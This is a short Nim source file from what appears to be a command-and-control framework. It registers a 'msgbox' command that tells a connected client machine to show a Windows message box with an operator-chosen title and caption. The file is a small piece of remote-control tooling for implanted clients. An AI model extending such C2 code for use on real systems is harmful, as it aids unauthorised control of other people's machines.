import asyncdispatch, strutils, tables

import ../../types

import ../../../clientTasks/msgbox

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  let cmdSplit = originalCommand.split(" ")
  let slashSplit = cmdSplit[1..(len(cmdSplit) - 1)].join(" ").split("/")
  
  discard await msgbox.sendTask(server.cli.handlingClient, slashSplit[1].strip(), slashSplit[0].strip())

let cmd*: Command = Command(
  execProc: execProc,
  name: "msgbox",
  argsLength: 3,
  usage: @["msgbox [title] / [caption]"],
  cliMode: @[ClientInteractMode],
  description: "Send a message box (Windows only)",
  category: CCClientInteraction,
  requiresConnectedClient: true
)